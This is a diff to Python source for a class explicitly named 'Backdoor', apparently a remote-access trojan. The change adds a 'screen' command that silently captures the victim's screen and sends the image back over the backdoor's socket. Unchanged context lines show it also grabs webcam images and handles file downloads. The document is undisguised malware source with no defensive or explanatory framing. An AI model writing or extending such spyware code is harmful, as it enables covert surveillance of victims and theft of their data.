@@ -1,4 +1,4 @@
-import socket, json, subprocess, os, cv2
+import socket, json, subprocess, os, cv2, pyautogui
 import base64, threading, time, webbrowser
 
 
@@ -100,6 +100,17 @@ class Backdoor:
 						cam.release()
 					except:
 						self.reliable_send("[-] Can't connect to any camera")
+
+				elif command == "screen":
+					try:
+						screenshot = pyautogui.screenshot()
+						filename = "scr.png"
+						screenshot.save(filename)
+						file = self.read_file(filename)
+						self.reliable_send(file)
+					except:
+						self.reliable_send("[-] Can't take screenshot")
+
 
 				elif command.split()[0] == "download":
 					file = command.replace("download", "").strip()
